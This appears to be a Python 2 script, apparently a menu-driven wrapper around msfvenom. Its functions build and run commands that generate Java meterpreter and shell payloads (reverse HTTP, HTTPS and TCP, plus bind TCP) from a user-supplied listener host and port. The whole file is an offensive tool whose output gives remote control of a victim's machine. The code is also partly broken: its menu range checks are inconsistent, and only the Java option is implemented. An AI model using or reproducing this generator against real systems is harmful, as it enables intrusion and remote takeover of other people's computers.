import os
import socket
import time
import source as sc




from termcolor import colored
from urllib2 import urlopen


# setup

#java meter
def create_payload_java_http(lh,lp,out, f, luri=None):
    if luri is None:
        phrase = "msfvenom -p java/meterpreter/reverse_http LHOST={} LPORT={} -f {} -o {}".format(lh, lp, f, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p java/meterpreter/reverse_http LHOST={} LPORT={} -f {}  LURI={} -o {}".format(lh, lp, f, luri, out)
        os.system(phrase)

def create_payload_java_https(lh,lp,out, f, luri=None):
    if luri is None:
        phrase = "msfvenom -p java/meterpreter/reverse_https LHOST={} LPORT={} -f {} -o {}".format(lh, lp, f, out)
        os.system(phrase)
    elif luri is not None:
        phrase = "msfvenom -p java/meterpreter/reverse_https LHOST={} LPORT={} -f {}  LURI={} -o {}".format(lh, lp, f, luri, out)
        os.system(phrase)


def create_payload_java_tcp(lh, lp, out, f):
    phrase = "msfvenom -p java/meterpreter/reverse_tcp LHOST={} LPORT={} -f {} -o {}".format(lh, lp, f, out)
    os.system(phrase)

def create_payload_android_bind_tcp(rh, lp, out, f):
    phrase = "msfvenom -p java/meterpreter/bind_tcp RHOST={} LPORT={} -f {} -o {}".format(rh, lp,f, out)
    os.system(phrase)

#shell
def create_payload_java_shell_tcp(lh, lp, out, f):
    phrase = "msfvenom -p java/shell/reverse_tcp LHOST={} LPORT={} -f {} -o {}".format(lh, lp, f, out)
    os.system(phrase)

def create_payload_android_shell_bind_tcp(rh, lp, out, f):
    phrase = "msfvenom -p java/shell/bind_tcp RHOST={} LPORT={} -f {} -o {}".format(rh, lp,f, out)
    os.system(phrase)














def banner():
    print colored("""
    +----------------------------------+---------+
    | Payload                          | Number  |
    +----------------------------------+---------+
    | Java payloads                    |    1    |
    | Python payloads                  |    2    | 
    | Php payloads                     |    3    |
    | Osx payloads                     |    4    |
    +----------------------------------+---------+

""", "magenta")

def banner_pay_java(x):
    # if x == "windows":
    #     print "\n"
    # else:
    sc.line(2)
    print "0: payload/{}/meterpreter/reverse_http".format(x)
    sc.line(2)
    print "1: payload/{}/meterpreter/reverse_https".format(x)
    sc.line(2)
    print "2: payload/{}/meterpreter/reverse_tcp ".format(x)
    sc.line(2)
    print "3: payload/{}/shell/bind_tcp".format(x)
    sc.line(2)
    print "4: payload/{}/shell/reverse_tcp".format(x)
    sc.line(2)
    print "5: payload/{}/meterpreter/bind_tcp ".format(x)
    sc.line(2)




def plat():
    banner()
    cho = input("Enter the payload type number:")
    if cho > 4 or cho < 1:
        while (cho > 3 or cho < 1):
            banner()
            cho = input("Enter the payload type number:")

    if cho == 1:#java
        plat = "java"
        banner_pay_java(plat)
        sc.pay_banner()
        co = input("Enter payload to use:")
        if co > 4 or co < 1:
            while (co > 3 or co < 1):
                sc.clear()
                banner_pay_java(plat)
                sc.pay_banner()
                co = input("Enter payload to use:")

        lhost = raw_input(sc.l_p)
        lport = raw_input(sc.p_p)
        output = raw_input(o_p)
        if co == 0:#meterpreter http
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input(uri)
                FORMAT = raw_input(format)
                create_payload_java_http(lhost, lport, output, FORMAT, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                FORMAT = raw_input(format)
                create_payload_java_http(lhost, lport, output, FORMAT)

        if co == 1:#meterpreter https
            LURI = raw_input("Do you want to set the URI?:")
            if LURI == "yes" or LURI == "YES" or LURI == "Y" or LURI == "y" or LURI == " yes" or LURI == " YES" or LURI == " Y" or LURI == " y":
                LURI_VALUE = raw_input(uri)
                FORMAT = raw_input(format)
                create_payload_java_https(lhost, lport, output, FORMAT, LURI_VALUE)

            if LURI == "no" or LURI == "NO" or LURI == "N" or LURI == "n" or LURI == " no" or LURI == " NO" or LURI == " N" or LURI == " n":
                FORMAT = raw_input(format)
                create_payload_java_https(lhost, lport, output, FORMAT)











#variables

oses = ("java", "python", "php", "osx")
uri = colored("ENTER the uri:", "red")
format = colored("ENTER the format of the file:", "red")
o_p = colored("Enter the path of the output file(including the extension .jar):", "red")
